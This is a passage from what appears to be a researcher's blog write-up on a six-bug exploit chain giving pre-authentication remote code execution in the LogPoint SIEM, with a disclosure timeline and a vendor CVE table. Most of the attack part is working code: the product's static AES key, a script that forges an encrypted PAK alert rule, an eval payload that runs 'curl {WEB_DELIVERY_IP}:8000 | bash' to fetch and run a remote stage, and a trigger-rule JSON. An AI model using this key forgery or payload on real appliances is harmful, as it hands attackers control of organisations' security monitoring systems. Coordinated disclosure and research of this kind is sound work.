<p>Now all I had to do was look for all the references of this <code>_Contion</code> class to see that these left or right can be anything other than an integer. The traverse back to the source from our sink. </p>



<p>There is only one place this function has been called, which is <code>_Alert.is_triggered()</code> . Thatâ€™s where the quite small mistake made my day!</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>def</span><span> </span><span>is_triggered</span><span>(self, rows_count, alert_id, field, field_values, time_range, throttling_enabled):</span></span>
<span><span>    </span><span>&#34;&#34;&#34;</span></span>
<span><span>    Evaluates whether the trigger condition has been reached for the alert.</span></span>
<span><span>    Returns True if condition has been met.</span></span>
<span><span>    &#34;&#34;&#34;</span></span>
<span><span>    alert_triggered </span><span>=</span><span> _Condition.evaluate(rows_count, </span><span>self</span><span>.get(</span><span>&#34;trigger_value&#34;</span><span>), </span><span>self</span><span>.get(</span><span>&#34;condition&#34;</span><span>))</span></span>
<span><span>    </span><span>if</span><span> alert_triggered </span><span>is</span><span> </span><span>None</span><span>:</span></span>
<span><span>        logging.warning(</span><span>&#34;alerting; condition unknown; alert_name=</span><span>%s</span><span>; condition=</span><span>%s</span><span>;&#34;</span><span>, </span><span>self</span><span>.get(</span><span>&#34;alert_name&#34;</span><span>), </span><span>self</span><span>.get(</span><span>&#34;condition&#34;</span><span>))</span></span>
<span><span>    </span><span>if</span><span> alert_triggered </span><span>is</span><span> </span><span>True</span><span>:</span></span>
<span><span>        </span><span>if</span><span> throttling_enabled </span><span>is</span><span> </span><span>True</span><span>:</span></span>
<span><span>            should_throttle </span><span>=</span><span> </span><span>self</span><span>.should_throttle_alert(alert_id, field, field_values, time_range)</span></span>
<span><span>            alert_triggered </span><span>=</span><span> </span><span>False</span><span> </span><span>if</span><span> should_throttle </span><span>else</span><span> </span><span>True</span></span>
<span><span>    </span><span>return</span><span> alert_triggered</span></span></code></pre></div>



<p>As you might remember, I can only place my payload into either the first or the second parameter of <code>evaluate()</code>. The second parameter is where the small but critical mistake happens. Instead of being validated, <code>self.get(&#34;trigger_value&#34;)</code> it simply pulls the value directly from the objectâ€™s attributes.</p>



<p>What makes this interesting is that <code>_Alert</code> already has a method designed specifically for this purpose. It properly casts the value to an <mark>integer</mark>. But that method is never used here! The value is taken straight from the getter and passed along as is.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>def</span><span> </span><span>get_trigger_value</span><span>(self): </span><span># Note: THIS FUNCTION IS NEVER USED mdisec</span></span>
<span><span>    </span><span>&#34;&#34;&#34;</span></span>
<span><span>    Returns alert trigger value</span></span>
<span><span>    &#34;&#34;&#34;</span></span>
<span><span>    </span><span>try</span><span>:</span></span>
<span><span>        trigger_value </span><span>=</span><span> </span><span>int</span><span>(</span><span>self</span><span>.get(</span><span>&#34;trigger_value&#34;</span><span>))</span></span>
<span><span>    </span><span>except</span><span> </span><span>ValueError</span><span>:</span></span>
<span><span>        trigger_value </span><span>=</span><span> </span><span>None</span></span>
<span><span>        logging.info(</span><span>&#34;alerting; invalid trigger value; integer expected; got trigger_value=</span><span>%s</span><span>&#34;</span><span>, </span><span>self</span><span>.get(</span><span>&#34;trigger_value&#34;</span><span>))</span></span></code></pre></div>



<p>Letâ€™s continue tracing the caller chain. The <code>is_triggered</code> function is only called from a single place. It lives inside the <code>AlertAnalyzer</code> class, which spans more than 300 lines of code. To keep the focus on what matters, I omit everything else and show only the lines relevant to the behavior in question.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>class</span><span> </span><span>AlertAnalyzer</span><span>:</span></span>
<span></span>
<span><span>    </span><span># ... OMITTED CODE ...</span></span>
<span></span>
<span><span>    </span><span>def</span><span> </span><span>analyze</span><span>(self, answer):</span></span>
<span><span>        search_id </span><span>=</span><span> answer.get(</span><span>&#34;orig_search_id&#34;</span><span>)</span></span>
<span><span>        alerts_list </span><span>=</span><span> </span><span>self</span><span>.search_alert_map.get_alert_list(search_id)</span></span>
<span><span>        </span></span>
<span><span>       </span><span># ... OMITTED CODE ...</span></span>
<span><span>        rows_count </span><span>=</span><span> </span><span>len</span><span>(answer.get(</span><span>&#34;rows&#34;</span><span>))</span></span>
<span><span>        </span></span>
<span><span>        </span><span>for</span><span> alert_id </span><span>in</span><span> alerts_list:</span></span>
<span><span>            alert </span><span>=</span><span> </span><span>self</span><span>.alerts.get(alert_id)</span></span>
<span><span>            </span><span># ... OMITTED CODE ...</span></span>
<span></span>
<span><span>            </span><span>if</span><span> alert.is_triggered(rows_count, alert_id, field, field_values, time_range,throttling_enabled):</span></span>
<span><span>                </span></span>
<span><span>                </span><span># ... OMITTED CODE ...</span></span></code></pre></div>



<p>The win condition is finally clear. If I can save my own alert in the database with a payload embedded in the <code>trigger_value</code> field, I can enable the rule using a deliberately generic query, so it always matches. The moment the engine evaluates that condition, it also evaluates my payload. That is the point where it stops being theory and becomes remote code execution.</p>



<figure><blockquote><p>The question is not whether a rule can be created.</p><cite>The real question is whether validation catches it this time, or whether I get lucky twice ?</cite></blockquote></figure>



<h2>Bug 6 â€“ Exploiting AES Static key to import encrypted PAK file to bypass integer validation</h2>



<p>The following UI screenshot shows how to create an alert rule, and unfortunately, we didnâ€™t get lucky twice in a row. Condition value is validated, and it expects me to send an integer. Therefore, there is no way that I can actually implant my payload into the rule!</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511cc931&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511cc931"><img loading="lazy" decoding="async" width="1024" height="335" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-1024x335.jpg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-1024x335.jpg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-300x98.jpg 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-768x251.jpg 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-1536x502.jpg 1536w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-alert-create-2048x669.jpg 2048w" sizes="auto, (max-width: 1024px) 100vw, 1024px"/></figure>



<p>That is the moment I realize I have tunnel vision. I am already deep down the rabbit hole, pushing in one direction for too long. It feels like the right time to step back, stop forcing it, and look for danger elsewhere.</p>



<p>I start closing browser tabs. And right before Iâ€™m done, I notice it.</p>



<p>I almost missed it.</p>



<p>A button quietly sitting there. <strong><mark>Export the Rule.</mark></strong> Button.</p>



<p>I export the rule and immediately notice something interesting. Its contents are encrypted. When I import it back into LogPoint, it gets decrypted and written into the database exactly as expected.</p>



<p>That is when a familiar pattern clicks. Encryption often creates an illusion of trust. Once data is encrypted, engineers often assume it is safe and unchanged and therefore skip the validation steps they would apply before. If the system trusts whatever comes out of decryption, then the real challenge is no longer validation.</p>



<p>All I need to do is understand how this encryption works and modify the rule. A closer look at the implementation reveals the crucial detail. The AES key used during the alert export process is static.</p>



<h3>Alert Rule Decryptor</h3>



<p>Most of the cryptography related code of the following script is taken directly from the original codebase. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>FORMAT_PREFIX</span><span> </span><span>=</span><span> </span><span>b</span><span>&#39;v2:&#39;</span></span>
<span><span>WEB_DELIVERY_IP</span><span> </span><span>=</span><span> </span><span>&#34;172.28.150.242&#34;</span><span>  </span><span># </span><span>TODO</span><span>: CHANGE THIS WITH YOUR IP WHERE YOU LISTEN FOR THE REVERSE SHELL</span></span>
<span><span>FLASK_APP_ENCRYPTION_KEY</span><span> </span><span>=</span><span> </span><span>&#39;ImmUnEsEcUrIty&#39;</span></span>
<span><span>ENC_KEY</span><span> </span><span>=</span><span> hashlib.md5(</span><span>FLASK_APP_ENCRYPTION_KEY</span><span>.encode(</span><span>&#34;utf-8&#34;</span><span>)).hexdigest()</span></span>
<span><span>CHECKSUM_LEN</span><span> </span><span>=</span><span> </span><span>16</span></span>
<span></span>
<span><span>CHECKSUM_LEN</span><span> </span><span>=</span><span> </span><span>16</span></span>
<span><span>FORMAT_PREFIX</span><span> </span><span>=</span><span> </span><span>b</span><span>&#39;v2:&#39;</span></span>
<span></span>
<span><span>def</span><span> </span><span>decrypt_data</span><span>(enc_data):</span></span>
<span><span>    </span><span>&#34;&#34;&#34;</span></span>
<span><span>    decrypts data encrypted by AES</span></span>
<span><span>    &#34;&#34;&#34;</span></span>
<span><span>    </span><span>IV</span><span> </span><span>=</span><span> </span><span>b</span><span>&#39;</span><span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span>&#39;</span></span>
<span><span>    </span><span>try</span><span>:</span></span>
<span><span>        </span><span>if</span><span> </span><span>not</span><span> enc_data.startswith(</span><span>FORMAT_PREFIX</span><span>):</span></span>
<span><span>            old_decoder </span><span>=</span><span> </span><span>AES</span><span>.new(tobytes(</span><span>ENC_KEY</span><span>), </span><span>AES</span><span>.</span><span>MODE_ECB</span><span>, </span><span>IV</span><span>)</span></span>
<span><span>            </span><span>return</span><span> old_decoder.decrypt(enc_data).rstrip(</span><span>b</span><span>&#39; &#39;</span><span>)</span></span>
<span><span>        obj </span><span>=</span><span> </span><span>AES</span><span>.new(tobytes(</span><span>ENC_KEY</span><span>), </span><span>AES</span><span>.</span><span>MODE_CFB</span><span>, </span><span>IV</span><span>)</span></span>
<span><span>        decrypted </span><span>=</span><span> obj.decrypt(enc_data[</span><span>len</span><span>(</span><span>FORMAT_PREFIX</span><span>):])</span></span>
<span><span>        checksum </span><span>=</span><span> decrypted[:</span><span>CHECKSUM_LEN</span><span>]</span></span>
<span><span>        raw_data </span><span>=</span><span> decrypted[</span><span>CHECKSUM_LEN</span><span>:]</span></span>
<span><span>        expected_checksum </span><span>=</span><span> hmac.new(tobytes(</span><span>ENC_KEY</span><span>), raw_data).digest()</span></span>
<span><span>        </span><span>if</span><span> checksum </span><span>!=</span><span> expected_checksum:</span></span>
<span><span>            </span><span>raise</span><span> </span><span>ValueError</span><span>(</span><span>&#34;invalid checksum&#34;</span><span>)</span></span>
<span><span>        </span><span>return</span><span> tostring(raw_data)</span></span>
<span><span>    </span><span>except</span><span> </span><span>ValueError</span><span> </span><span>as</span><span> e:</span></span>
<span><span>        </span><span>try</span><span>:</span></span>
<span><span>            </span><span>print</span><span>(</span><span>&#34;webserver import data; error=</span><span>%s</span><span>&#34;</span><span> </span><span>%</span><span> e)</span></span>
<span><span>            </span><span>return</span></span>
<span><span>        </span><span>finally</span><span>:</span></span>
<span><span>            e </span><span>=</span><span> </span><span>None</span></span>
<span><span>            </span><span>del</span><span> e</span></span>
<span></span>
<span><span>def</span><span> </span><span>encrypt_data</span><span>(raw_data):</span></span>
<span><span>    </span><span>&#34;&#34;&#34;encrypts long data</span></span>
<span><span>    &#34;&#34;&#34;</span></span>
<span><span>    </span><span>IV</span><span> </span><span>=</span><span> </span><span>b</span><span>&#39;</span><span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span>&#39;</span></span>
<span><span>    raw_data </span><span>=</span><span> tobytes(raw_data)</span></span>
<span><span>    checksum </span><span>=</span><span> hmac.new(tobytes(</span><span>ENC_KEY</span><span>), raw_data).digest()</span></span>
<span><span>    </span><span>assert</span><span> </span><span>len</span><span>(checksum) </span><span>==</span><span> </span><span>CHECKSUM_LEN</span></span>
<span><span>    obj </span><span>=</span><span> </span><span>AES</span><span>.new(tobytes(</span><span>ENC_KEY</span><span>), </span><span>AES</span><span>.</span><span>MODE_CFB</span><span>, </span><span>IV</span><span>)</span></span>
<span><span>    </span><span>return</span><span> </span><span>FORMAT_PREFIX</span><span> </span><span>+</span><span> obj.encrypt(checksum </span><span>+</span><span> raw_data)</span></span>
<span></span>
<span></span>
<span><span>def</span><span> </span><span>decrypt_pak_alertrule</span><span>():</span></span>
<span><span>    </span><span>with</span><span> </span><span>open</span><span>(</span><span>&#39;mdisec-generated-backdoored-implanted-rule.pak&#39;</span><span>, </span><span>&#39;rb&#39;</span><span>) </span><span>as</span><span> f:</span></span>
<span><span>        data </span><span>=</span><span> f.read()</span></span>
<span><span>        </span><span># save as alert.json</span></span>
<span><span>        </span><span>with</span><span> </span><span>open</span><span>(</span><span>&#39;alert.json&#39;</span><span>, </span><span>&#39;w&#39;</span><span>) </span><span>as</span><span> f:</span></span>
<span><span>            f.write(decrypt_data(data))</span></span>
<span></span>
<span><span>def</span><span> </span><span>generate_backdoored_pak_file</span><span>():</span></span>
<span><span>    </span><span>with</span><span> </span><span>open</span><span>(</span><span>&#39;alert.json&#39;</span><span>, </span><span>&#39;r&#39;</span><span>) </span><span>as</span><span> f:</span></span>
<span><span>        data </span><span>=</span><span> f.read()</span></span>
<span><span>        </span><span># load json and modify the alert rule</span></span>
<span><span>        data </span><span>=</span><span> json.loads(data)</span></span>
<span><span>        data[</span><span>&#39;Alert&#39;</span><span>][</span><span>0</span><span>][</span><span>&#39;name&#39;</span><span>] </span><span>=</span><span> generate_random_string()</span></span>
<span><span>        data[</span><span>&#39;Alert&#39;</span><span>][</span><span>0</span><span>][</span><span>&#39;settings&#39;</span><span>][</span><span>&#39;alertrule_id&#39;</span><span>] </span><span>=</span><span> hashlib.md5(generate_random_string().encode()).hexdigest()</span></span>
<span><span>        data[</span><span>&#39;Alert&#39;</span><span>][</span><span>0</span><span>][</span><span>&#39;settings&#39;</span><span>][</span><span>&#39;condition&#39;</span><span>][</span><span>&#39;condition_value&#39;</span><span>] </span><span>=</span><span> </span><span>&#34;eval(</span><span>\&#34;</span><span>__import__(&#39;os&#39;).system(&#39;curl </span><span>{WEB_DELIVERY_IP}</span><span>:8000 | bash&#39;)</span><span>\&#34;</span><span>)&#34;</span></span>
<span><span>        </span><span>with</span><span> </span><span>open</span><span>(</span><span>&#39;backdoored-implanted-rule.pak&#39;</span><span>, </span><span>&#39;wb&#39;</span><span>) </span><span>as</span><span> f:</span></span>
<span><span>            f.write(encrypt_data(json.dumps(data)))</span></span>
<span><span>            </span><span># save json as plain text</span></span>
<span><span>            </span><span>with</span><span> </span><span>open</span><span>(</span><span>&#39;backdoored-implanted-rule.json&#39;</span><span>, </span><span>&#39;w&#39;</span><span>) </span><span>as</span><span> f:</span></span>
<span><span>                f.write(json.dumps(data, </span><span>indent</span><span>=</span><span>4</span><span>))</span></span>
<span></span>
<span><span>&#34;&#34;&#34;</span></span>
<span><span># pip3 install pycryptodome</span></span>
<span><span>&#34;&#34;&#34;</span></span>
<span><span>decrypt_pak_alertrule()</span></span>
<span><span>generate_backdoored_pak_file()</span></span></code></pre></div>



<p>One of the shortest paths to a shell is a simple web delivery payload. Once our payload runs, LogPoint appliance will run <code>curl </code>command to get the 2nd stage of the payload from our server and pipe it into the <code>bash</code>! Bit noisy yeah, but this is also not a red-team exercise.</p>



<p>I wrap the payload inside an <code>eval()</code> call because the sink in <code>_Condition.evaluate()</code> concatenates additional strings around the variable. That behavior makes it easy to run into Python syntax errors, which is something I want to avoid entirely. The goal is simple: execute my code cleanly. Anything that happens after my own <code>eval()</code> runs is irrelevant.</p>



<p>Once I imported the <mark>backdoored-implanted-rule.pak</mark> file I generated, rule successfully imported! Now I need to find a way to trigger the rule ðŸ™‚</p>



<h2>Last step: How To Trigger the Alert</h2>



<p>Importing the modified alert is not enough. I still need a way to trigger it and reach the vulnerable code path.</p>



<p>The simplest approach is to create a rule and attach it to the alert. Conveniently, this can be done inside the same PAK file. I open the <code>alert.json</code> file generated during the <code>alert-pak-file-decrypt.run</code> step and start wiring the pieces together.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>&#34;livesearch_data&#34;</span><span>: {</span></span>
<span><span>  </span><span>&#34;generated_by&#34;</span><span>: </span><span>&#34;alert&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;searchname&#34;</span><span>: </span><span>&#34;mdi&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;description&#34;</span><span>: </span><span>&#34;&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;flush_on_trigger&#34;</span><span>: </span><span>false</span><span>,</span></span>
<span><span>  </span><span>&#34;query&#34;</span><span>: </span><span>&#34;</span><span>\&#34;</span><span>user_agent</span><span>\&#34;</span><span>=</span><span>\&#34;</span><span>*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)*</span><span>\&#34;</span><span> </span><span>\&#34;</span><span>GET</span><span>\&#34;</span><span> robots.txt&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;repos&#34;</span><span>: [</span></span>
<span><span>    </span><span>&#34;127.0.0.1:5504&#34;</span></span>
<span><span>  ],</span></span>
<span><span>  </span><span>&#34;extra_query_filter&#34;</span><span>: </span><span>&#34;&#34;</span><span>,</span></span>
<span><span>  </span><span>&#34;query_info&#34;</span><span>: {</span></span>
<span><span>    </span><span>&#34;aliases&#34;</span><span>: [],</span></span>
<span><span>    </span><span>&#34;columns&#34;</span><span>: [],</span></span>
<span><span>    </span><span>&#34;fieldsToExtract&#34;</span><span>: [</span></span>
<span><span>      </span><span>&#34;user_agent&#34;</span><span>,</span></span>
<span><span>      </span><span>&#34;msg&#34;</span></span>
<span><span>    ],</span></span>
<span><span>    </span><span>&#34;grouping&#34;</span><span>: [],</span></span>
<span><span>    </span><span>&#34;lucene_query&#34;</span><span>: </span><span>&#34;((user_agent:*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)* AND GET) AND robots.txt)&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;query_filter&#34;</span><span>: </span><span>&#34;</span><span>\&#34;</span><span>user_agent</span><span>\&#34;</span><span>=</span><span>\&#34;</span><span>*Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)*</span><span>\&#34;</span><span> </span><span>\&#34;</span><span>GET</span><span>\&#34;</span><span> robots.txt&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;query_type&#34;</span><span>: </span><span>&#34;simple&#34;</span><span>,</span></span>
<span><span>    </span><span>&#34;success&#34;</span><span>: </span><span>true</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>The rule itself is deliberately simple. If there is a GET request to <code>robots.txt</code> with a Google crawler user agent, the rule triggers.</p>



<p>I send around a hundred requests to hit the threshold. Since the rule scans logs from the past 30 days and runs every minute, I just need to wait briefly for the engine to pick it up and execute.</p>



<p>(By default, Logpoint populates its own logs into the indexes. That means we can use LogPoint HTTP port to send these robots.txt requests)</p>



<h2>Exploit in Action: Chaining 6 bugs + 1 feature together! Pre-authenticated Remote Code Execution</h2>



<p>I record my exploit on action</p>



<asciinema-player src="/wp-content/uploads/logpoint-exploit-asciinema.json" cols="145" rows="35"></asciinema-player>



<h2>Recap of the attack chain</h2>



<p>What begins as a routing issue at the edge propagates through internal services, authentication logic, and finally reaches the Python backend, static AES key, and Code Eval bug, resulting in remote code execution. The diagram below shows the complete flow.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511cd42b&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511cd42b"><img loading="lazy" decoding="async" width="1024" height="801" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-1024x801.png" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-1024x801.png 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-300x235.png 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-768x601.png 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-1536x1202.png 1536w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-exploit-chain-1-2048x1603.png 2048w" sizes="auto, (max-width: 1024px) 100vw, 1024px"/></figure>



<h2>Public Disclosure Timeline</h2>



<ul>
<li>30/05/2024 11:00 BST <mark>â€“</mark> The LogPoint product security website instructed users to â€œCreate a support ticket,â€ but it did not allow me to create a support account. I could not find any email address or alternative channel to report the issue for coordinated vulnerability disclosure.</li>



<li>30/05/2024 15:01 BST <mark>â€“</mark> I sent LinkedIn InMail messages to LogPoint employees to identify a point of contact. (This is, quite literally, the only reason I keep paying for LinkedIn Premium each year.)</li>



<li>30/05/2024 17:28 BST <mark>â€“</mark> One of the LogPoint executives replied promptly, and we began corresponding via email.</li>



<li>30/05/2024 22:18 BST <mark>â€“</mark> The same executive confirmed that the disclosure was already being processed.</li>



<li>10/06/2024 10:04 BST <mark>â€“</mark> I requested a status update.</li>



<li>10/06/2024 12:03 BST <mark>â€“</mark> The vendor confirmed that they were actively working on a fix.</li>



<li>20/06/2024 05:20 BST <mark>â€“</mark> The vendor provided an update indicating that fixes for the three reported vulnerabilities were in progress.</li>



<li>20/06/2024 09:28 BST <mark>â€“</mark> A detailed email was sent offering pre-release patch analysis support and providing background on threat intelligence and 0-day research activities. It was explicitly clarified that the communication was not sales-related and was made in the context of coordinated vulnerability disclosure.</li>



<li>16/07/2024 08:38 BST <mark>â€“</mark> The vendor acknowledges and appreciates the offer of patch analysis, confirms that fixes are in progress.</li>



<li>22/07/2024 13:03 BST <mark>â€“</mark> I reported 8 additional critical vulnerabilities.</li>



<li>24/07/2024 06:45 BST <mark>â€“</mark> The vendor acknowledged receipt of the additional vulnerability report.</li>



<li>19/08/2024 09:10 BST <mark>â€“</mark> 80 days had passed since the initial disclosure. I requested an update.</li>



<li>21/08/2024 09:53 BST <mark>â€“</mark> The vendor confirmed that the initially reported vulnerabilities have been fixed and are nearing release, and public disclosure will only occur after the official release.</li>



<li>19/09/2024 13:00 BST <mark>â€“</mark> 112 days had passed since the initial disclosure of the 3 vulnerabilities, and 60 days had passed without a hotfix or meaningful update regarding the additional 8 vulnerabilities, some of which included pre-authentication RCE vectors. As a result, we took proactive steps to notify affected organizations.</li>



<li>3/10/2024 00:00 CET  <mark>â€“</mark> LogPoint released patches in the Priority Access release of version 7.5.0.</li>



<li>31/10/2024 11:03 CET <mark>â€“</mark> I became aware of LogPointâ€™s public blog post announcing the release.</li>



<li>14/01/2025 16:24 BST <mark>â€“</mark> 229 days later, we published our first public disclosure, without releasing full technical details.</li>



<li>02/01/2026 <mark>â€“</mark> Due to the vendorâ€™s continued lack of communication, I concluded that substantial architectural changes were still in progress. Given the severity of the vulnerabilities in a SIEM/SOAR security product, I have decided to delay publication of the full technical write-up by 365 days.</li>
</ul>



<h2>Official announcement from the vendor</h2>



<p>The following table shows the CVE numbers and severities issued by the vendor. </p>



<figure><table><thead><tr><th data-align="center">Title</th><th data-align="center">CVSS Severity</th><th>Description</th></tr></thead><tbody><tr><td data-align="center">CVE-2024-56086</td><td data-align="center">7.1 High</td><td>Report Templates RCE</td></tr><tr><td data-align="center">CVE-2024-56085</td><td data-align="center">5.9 Medium</td><td>Server-Side Template Injection RCE</td></tr><tr><td data-align="center">CVE-2024-48954</td><td data-align="center">6.4 Medium</td><td>EventHub Collector OS Cmd Injection</td></tr><tr><td data-align="center">CVE-2024-48953</td><td data-align="center">7.5 High</td><td>Unauthenticated Plugin Registration</td></tr><tr><td data-align="center">CVE-2024-48950</td><td data-align="center">7.5 High</td><td>Authentication and CSRF bypass</td></tr><tr><td data-align="center">CVE-2024-56084</td><td data-align="center">7.1 High</td><td>Universal Normalizer RCE</td></tr><tr><td data-align="center">CVE-2024-48951</td><td data-align="center">7.5 High</td><td>SSRF</td></tr><tr><td data-align="center">CVE-2024-56087</td><td data-align="center">5.9 Medium</td><td>Server-Side Template Injection RCE</td></tr><tr><td data-align="center">CVE-2024-48952</td><td data-align="center">6.4 Medium</td><td>Static JWT Secret Key</td></tr></tbody></table><figcaption>Vendor CVE and <strong>CVSSv 4.0</strong> scoring list</figcaption></figure>



<p><mark>LogPoint </mark>is a European-born security platform headquartered in Copenhagen, Denmark, founded in the early 2000s with a focus on large-scale log ingestion and correlation. What started as a log management solution evolved into a unified <strong>SIEM, SOAR, and UEBA</strong> platform, designed to support detection engineering, investigation workflows, and automated response across complex enterprise environments. Today, <mark>LogPoint</mark> operates globally, serving more than 1000+ organizations that rely on it for both real-time threat detection and compliance-driven security monitoring.</p>








</article></div>
  </body>
</html>
